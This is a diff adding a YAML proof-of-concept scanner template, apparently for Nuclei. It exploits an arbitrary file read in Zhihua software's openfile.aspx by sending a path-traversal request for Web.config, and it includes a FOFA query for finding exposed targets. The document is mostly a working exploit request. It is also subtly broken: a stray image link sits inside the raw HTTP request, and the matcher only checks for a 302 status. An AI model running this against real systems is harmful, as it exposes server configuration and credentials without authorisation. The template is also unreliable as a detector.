@@ -1,0 +1,38 @@
+id: poc-bnq9eoy9fwnsbzve
+info:
+  name: 志华软件openfile.aspx存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bnq9eoy9fwnsbzve'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bnq9eoy9fwnsbzve
+    fofa: body="b28web/Utility/"
+http:
+- raw:
+  - 'GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: ASP.NET_SessionId=1mecw0jr5ko2imrfjlhlnfom
+
+    Connection: close
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077497237-dd7afba4-db0b-4deb-bfd7-1e1ea191dee4.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 302
+    type: status
